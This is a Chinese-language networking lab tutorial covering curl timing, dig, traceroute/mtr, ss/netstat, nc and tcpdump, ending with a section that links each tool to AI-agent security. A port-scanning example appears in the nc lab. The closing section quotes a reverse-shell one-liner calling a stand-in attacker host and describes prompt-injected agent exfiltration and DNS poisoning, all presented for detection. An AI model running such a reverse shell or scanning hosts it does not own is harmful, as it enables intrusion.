1. LAB 1：curl 高级——看一个请求的分阶段耗时

curl 你一定用过，但 99% 的人只用它下载东西。今天把它当成网络诊断仪：一个 HTTPS 请求从 DNS 解析、TCP 握手、TLS 握手到首字节返回，每一阶段花了多少毫秒，curl 全能拆给你看。这正好把本周 Day 15-18 的协议栈串成一条时间线。

步骤

A看响应头和协议版本。
# -I 只发 HEAD 请求，只看响应头
curl -I https://www.cloudflare.com

# -v 看完整握手细节（DNS、TCP、TLS、HTTP 全过程）
curl -v https://www.cloudflare.com -o /dev/null
解读：-v 输出里 * 开头是 curl 的诊断信息，> 是你发出去的请求行，< 是服务器返回的。你能看到 * Connected to ...（TCP 建好了）、* TLSv1.3 ... handshake（Day 18 的 TLS 握手）、* using HTTP/2（Day 17 的协议升级）。这一屏就是本周前四天的协议栈的实况。
B用 -w 打印分阶段耗时——这是今天最值钱的一招。
# 把这段存成一个格式模板
cat > /tmp/curl-timing.txt <<'EOF'
    DNS 解析:  %{time_namelookup}s
    TCP 连接:  %{time_connect}s
   TLS 握手:  %{time_appconnect}s
  服务器处理:  %{time_starttransfer}s
   ===========================
      总耗时:  %{time_total}s
   HTTP 版本:  %{http_version}
     状态码:  %{http_code}
EOF

curl -w "@/tmp/curl-timing.txt" -o /dev/null -s https://www.cloudflare.com
预期：你会看到类似 DNS 解析: 0.012s / TCP 连接: 0.045s / TLS 握手: 0.110s / 服务器处理: 0.160s / 总耗时: 0.165s。注意这几个数字是累计的（从请求开始算起），不是各阶段独立耗时。想知道 TLS 握手单独花了多久？用 time_appconnect - time_connect。线上排查"接口慢"时，第一件事就是用这招定位慢在哪一段——DNS 慢、还是建连慢、还是后端慢，一目了然。
C对比 HTTP/1.1 vs HTTP/2，复用连接 vs 每次新建。
# 强制用 HTTP/1.1
curl -w "%{http_version} %{time_total}s\n" -o /dev/null -s --http1.1 https://www.cloudflare.com

# 强制用 HTTP/2（默认就会协商成 h2）
curl -w "%{http_version} %{time_total}s\n" -o /dev/null -s --http2 https://www.cloudflare.com

# 一个连接里连发 3 个请求（看连接复用省下的握手时间）
curl -s -o /dev/null -w "%{time_total}s\n" \
  https://www.cloudflare.com https://www.cloudflare.com https://www.cloudflare.com
解读：第三条命令里，第一个请求要做完整的 DNS+TCP+TLS，后两个请求复用同一条连接，所以总耗时远小于 3 倍单次。这就是 Day 17 讲的 keep-alive / 连接复用的价值——也是为什么你调 LLM API 时要用一个持久的 httpx.Client 而不是每次 requests.get 新建连接。

2. LAB 2：dig / nslookup——DNS 解析全过程

Day 15 讲了 ARP/IP，Day 21（周日）会专门讲 DNS。今天先用 dig 把"域名 → IP"这一步看清楚——它是每个网络请求的第 0 步，也是最容易被忽视、最容易出问题的一步。

步骤

A最基本的解析。
dig www.cloudflare.com

# mac 也自带 nslookup（更简洁，但信息少）
nslookup www.cloudflare.com
解读 dig 输出：看 ;; ANSWER SECTION: 下面的行，格式是 域名 TTL IN A IP地址。A 记录是 IPv4 地址，AAAA 是 IPv6。TTL（生存时间，秒）告诉解析器"这条结果能缓存多久"——这就是为什么你改了 DNS 不会立刻生效。底部 ;; Query time: 12 msec 是这次解析耗时。
B查不同类型的记录。
dig cloudflare.com A        # IPv4 地址
dig cloudflare.com AAAA     # IPv6 地址
dig cloudflare.com MX       # 邮件服务器
dig cloudflare.com NS       # 这个域名由哪些权威 DNS 服务器负责
dig cloudflare.com TXT      # 文本记录（常放 SPF、域名所有权验证）

# +short 只要答案，不要一堆元信息
dig +short www.cloudflare.com
C看完整的递归解析链——从根服务器一步步问下来。
dig +trace www.cloudflare.com
预期：+trace 会打印一整条链：先问根服务器（.）".com 谁管？"→ 根告诉你 .com 的 NS → 再问 .com 服务器"cloudflare.com 谁管？"→ 拿到 cloudflare 的权威 NS → 最后问权威 NS 拿到 IP。这就是 Day 21 要讲的"递归 vs 迭代解析"的迭代过程，你今天先亲眼看一遍这条链。
D指定用哪台 DNS 服务器解析（绕过本机默认）。
# 用 Cloudflare 的公共 DNS 1.1.1.1 解析
dig @1.1.1.1 www.cloudflare.com

# 用 Google 的 8.8.8.8
dig @8.8.8.8 www.cloudflare.com
思考：同一个域名，用不同 DNS 服务器解析，可能拿到不同的 IP——这不是 bug，是 CDN 的就近调度：DNS 服务器根据你的位置返回最近的边缘节点。当你怀疑"是不是 DNS 被污染了 / 解析到了错误的机房"，dig @不同DNS 对比是第一招。

3. LAB 3：traceroute / mtr——包走过哪些路由器

Day 15 讲了 IP 包逐跳转发、TTL（生存时间）字段。traceroute 就是利用 TTL 的一个巧妙把戏：它发出 TTL=1 的包，第一个路由器会把它丢弃并回一个"超时"错误（暴露了自己的 IP）；再发 TTL=2，第二个路由器暴露……这样一跳一跳把整条路径"逼"出来。

步骤

A追踪到一个目标的完整路径。
traceroute www.cloudflare.com

# 默认用 UDP 探测，有些路由器不回。改用 ICMP（mac 加 -I），成功率更高
sudo traceroute -I www.cloudflare.com
解读：每一行是一"跳"（一个路由器），格式 跳数 路由器IP/域名 三次往返延迟(ms)。第 1 跳通常是你家路由器（192.168.x.1），往后是运营商的网关、骨干网，最后到目标。看到 * * * 是正常的——有些路由器配置了不回 ICMP，不代表断了。延迟突然从 10ms 跳到 150ms 的那一跳，往往就是出国 / 跨运营商的链路。
B用 mtr——traceroute 和 ping 的结合体，持续刷新统计。
# mac 需要先装：brew install mtr
# 报告模式：跑 10 个周期后输出统计表
sudo mtr -r -c 10 www.cloudflare.com

# 交互模式（实时刷新，按 q 退出）
sudo mtr www.cloudflare.com
预期：mtr 的核心列是 Loss%（丢包率）和 Avg（平均延迟）。看 Loss% 在哪一跳开始升高，就定位到了网络问题发生在哪一段。注意一个坑：中间某跳显示丢包、但后面的跳又不丢，通常是那台路由器限速了 ICMP 回包，不是真丢包——只有"从某跳开始一直丢到终点"才是真问题。这是排查跨地域网络抖动的利器。

4. LAB 4：ss / netstat——本机连接与 TCP 状态机

Day 16 画了 TCP 状态机：LISTEN → SYN_SENT → ESTABLISHED → ... → TIME_WAIT → CLOSED。这些状态不是抽象概念，你本机此刻就有几十上百条连接处在不同状态。ss（Linux）/ netstat（mac+Linux）让你把状态机的快照打出来看。

步骤

A看本机所有监听端口（谁在等连接）。
# Linux: ss 是 netstat 的现代替代，快得多
ss -tlnp      # -t TCP -l listening -n 数字端口 -p 进程

# mac 没有 ss，用 netstat 或 lsof
netstat -an -p tcp | grep LISTEN
sudo lsof -iTCP -sTCP:LISTEN -n -P    # mac 上看监听端口+进程，最好用
解读：每个监听项是一个"服务器在某端口等客人"。*:8000 或 0.0.0.0:8000 表示监听所有网卡（外网可达，注意安全！），127.0.0.1:8000 表示只监听本机回环（外网连不上，安全）。部署 LLM 服务时把 vLLM 绑到 0.0.0.0 还是 127.0.0.1，直接决定它是否暴露在公网——这是最常见的安全事故来源之一。
B看所有已建立的连接，并按状态统计。
# Linux
ss -tan                                    # 列所有 TCP 连接 + 状态
ss -tan | awk 'NR>1 {print $1}' | sort | uniq -c   # 按状态统计数量

# mac
netstat -an -p tcp | awk '{print $6}' | sort | uniq -c
预期：你会看到一张状态分布表，类似 45 ESTABLISHED / 12 TIME_WAIT / 3 LISTEN / 1 CLOSE_WAIT。ESTABLISHED 是正在用的连接；TIME_WAIT 是主动关闭方留下的"等 2MSL"的尾巴（Day 16 讲过，防止旧包串场）；如果看到大量 CLOSE_WAIT 堆积，那是 bug 信号——说明对方关了连接但你的程序忘了 close()，文件描述符在泄漏。
C制造一条连接，盯着它的状态变化。
# 终端 1：起一个监听
nc -l 9999          # mac;  Linux 用 nc -l -p 9999

# 终端 2：连上去
nc 127.0.0.1 9999

# 终端 3：看这条连接的状态（应该是 ESTABLISHED）
netstat -an -p tcp | grep 9999     # mac
# ss -tan | grep 9999              # Linux

# 现在在终端 2 按 Ctrl+C 断开，立刻再看终端 3
# 你会看到状态变成 TIME_WAIT，几十秒后消失
解读：你刚刚亲手驱动了一遍 TCP 状态机：建连时 ESTABLISHED，主动关闭方进入 TIME_WAIT 并停留约 2×MSL（mac 默认 ~15-30s，Linux ~60s）后才消失。这就是为什么压测工具频繁建连断连时，机器会积压成千上万的 TIME_WAIT 占满端口——也是 Day 16 提到 SO_REUSEPORT 和调内核参数的由来。

5. LAB 5：nc——手敲一个 HTTP 请求

nc（netcat）被称为网络界的瑞士军刀：它能在任意 TCP/UDP 端口上收发原始字节。今天用它干一件"揭穿魔法"的事——用手敲的方式发一个 HTTP 请求，让你彻底明白 Day 17 讲的"HTTP 不过是 TCP 上的纯文本"。

步骤

A手敲 HTTP/1.1 请求（明文 HTTP，不带 TLS）。
# 连到一个支持明文 HTTP 的站点的 80 端口
nc example.com 80

# 连上后，手动逐行输入下面三行（最后必须敲两次回车！）：
GET / HTTP/1.1
Host: example.com
预期：敲完空行（这个空行告诉服务器"请求头结束了"）后，服务器立刻把响应吐回来：HTTP/1.1 200 OK + 一堆响应头 + 空行 + HTML 正文。你刚刚没用任何浏览器、没用 curl，纯手打字符就完成了一次 HTTP 请求——这就证明了 HTTP/1.1 本质是"在 TCP 连接上互发纯文本"。Day 17 讲的请求行、Host 头、空行分隔，你现在亲手敲了一遍。
B用脚本方式发（不手打），看完整响应。
printf 'GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n' \
  | nc example.com 80
解读：注意行尾是 \r\n（回车+换行）——HTTP 协议规定每行必须用 CRLF 结尾，这是协议的硬性格式。Connection: close 告诉服务器"回完就断开"，否则连接会 keep-alive 挂着等你下一个请求。
C用 nc 做端口扫描——探测某主机开了哪些端口。
# -z 只探测不发数据（zero-I/O），-v 显示结果，-w 超时
nc -zv example.com 80 443 22 2>&1

# 扫一个端口范围（mac/Linux 通用）
nc -zv 127.0.0.1 8000-8010 2>&1
解读：succeeded / open 表示该端口有服务在监听，refused 表示端口关闭（机器明确拒绝），超时无响应则通常是被防火墙挡了（连拒绝都不回）。这就是 nmap 这类扫描器的最朴素原理——Day 27 周六的 C2 专题、以及后面红队内容会深入。只扫你自己拥有或获得授权的主机。

6. LAB 6：tcpdump / Wireshark——亲眼看三次握手

压轴。Day 16 画了 TCP 三次握手 SYN → SYN+ACK → ACK 的图。今天用 tcpdump 抓真实的包，在你自己的网卡上看到这三个包飞过去。看完这一节，三次握手对你就不再是课本插图，而是亲眼见过的东西。

注意：抓包需要 sudo。抓包会看到流经网卡的所有流量——只在你自己的机器、自己的网络上抓，且不要长期记录他人流量。这是法律与伦理底线。

步骤

A抓一次握手——先开抓包，再发请求。
# 终端 1：开始抓包。先用 dig 拿到 example.com 的一个 IP，比如 93.184.x.x
dig +short example.com
# 假设拿到 93.184.215.14，盯住到它 80 端口的包：
sudo tcpdump -n -i any "host 93.184.215.14 and port 80"

# 终端 2：发一个请求触发握手
curl -s http://example.com -o /dev/null
预期：终端 1 会先打印三行，正是三次握手：
... Flags [S], seq 12345 ...  ← 你发出的 SYN
... Flags [S.], seq 67890, ack 12346 ...  ← 服务器回的 SYN+ACK（. 代表 ACK 标志位）
... Flags [.], ack 67891 ...  ← 你回的 ACK
之后才是 Flags [P.]（PUSH+ACK，带 HTTP 数据的包）。seq 和 ack 号一一对应（ack = 对方 seq + 1），你亲眼看到了 Day 16 讲的序列号确认机制。结尾还能看到 Flags [F.]（FIN）的挥手过程。
B读懂 tcpdump 常用过滤表达式（周六会深入）。
sudo tcpdump -n -i any "tcp port 443"          # 只抓 443（HTTPS）
sudo tcpdump -n -i any "host 1.1.1.1"          # 只抓和某 IP 的往来
sudo tcpdump -n -i any "tcp[tcpflags] & tcp-syn != 0"   # 只抓含 SYN 标志的包
sudo tcpdump -n -i any "udp port 53"           # 只抓 DNS 查询（UDP 53）
sudo tcpdump -n -i any -c 20 -w /tmp/cap.pcap "port 80"  # 抓 20 个包存成文件
解读：-n 不做反向 DNS（否则抓包时会卡）；-i any 抓所有网卡；引号里是 BPF 过滤表达式，能精确到协议、端口、IP、甚至 TCP 标志位。-w file.pcap 把原始包存成文件——这个 .pcap 文件可以拖进 Wireshark 用图形界面慢慢分析。
C（可选）用 Wireshark 图形化看。
# mac 安装：brew install --cask wireshark
# 把上一步存的文件用 Wireshark 打开：
open -a Wireshark /tmp/cap.pcap
玩法：在 Wireshark 顶部过滤框输入 tcp.flags.syn==1 只看 SYN 包；右键任一包选 Follow → TCP Stream，能把一条连接的所有来回字节按顺序拼出来看（HTTP 明文请求/响应一览无余）。Day 20（明天周六）会专门深入 Wireshark + TLS 解密，今天先建立"原来包能被肉眼看到"的直觉。

🔗 与 AI / Agent 安全的连结

1. ss/netstat 是发现"Agent 偷连外网"的第一道哨兵。你的 Agent 安全产品要监控不可信代码的网络行为——当一段被 prompt injection 诱导的代码尝试把数据外传（exfiltration），它必须先建一条 TCP 连接。在沙箱里周期性跑 ss -tanp 快照、比对"白名单之外的 ESTABLISHED 连接"，就是最朴素有效的检测。生产环境会换成 eBPF（Week 2 提过）实时拦截 connect() syscall，但 ss 让你今天就建立"连接可见"的直觉。

2. curl -w 的分阶段耗时是 LLM 网关 SLO 的诊断起点。你的 LLM 推理网关 P99 延迟飙了，到底是 DNS 慢、上游 TCP/TLS 建连慢、还是模型后端处理慢？今天 LAB 1 的 time_namelookup / time_connect / time_appconnect / time_starttransfer 四段拆解，直接对应你将来在 Grafana 里要拆的延迟瀑布图。对流式 LLM 响应尤其关键：time_starttransfer 约等于 TTFT（首 token 时间），是用户最敏感的指标。

3. nc 是反弹 shell 的经典载体——你必须先会用它，才能检测它。Day 27 周六会讲 C2 与反弹 shell，其中最教科书的一行就是 nc -e /bin/sh attacker_ip 4444。一个被攻陷的 Agent 沙箱，攻击者最想做的就是建一条反弹连接拿到交互式 shell。今天你手动用 nc 起监听、连接、扫端口，正是为了理解检测侧要盯什么：非常规端口的出站连接 + 连接上立刻有 shell 流量。

4. tcpdump 抓包是"模型 API 到底发了什么"的终极真相。当你怀疑某个第三方 LLM SDK 偷偷上传了你的 prompt、或想确认请求里有没有泄漏 API key，应用层日志可能撒谎、可能不全，但网卡上的字节不会骗人。今天 LAB 6 的 tcpdump + Follow TCP Stream，就是你将来做"数据流真实性审计"的底层手段。HTTPS 加密看不到内容?——明天 Day 20 会教你用 SSLKEYLOGFILE 解密自己的 TLS 流量看明文。

5. dig @不同DNS 对应 Agent 世界里的"工具被指向恶意端点"风险。DNS 是信任链的第 0 环：如果一个 Agent 要调用 api.trusted-tool.com，但本地 DNS 被污染、解析到了攻击者的 IP，Agent 就会把请求(连带凭据)发给假服务器。今天用 dig +trace 看清整条解析链、用 dig @1.1.1.1 对比不同解析结果，是你将来做"工具端点可信验证 / DNS 投毒检测"的基础认知。这也是为什么零信任架构里要做 mTLS（Day 18 提过、Day 111 深入）——不光信 DNS，还要用证书验证对方真实身份。
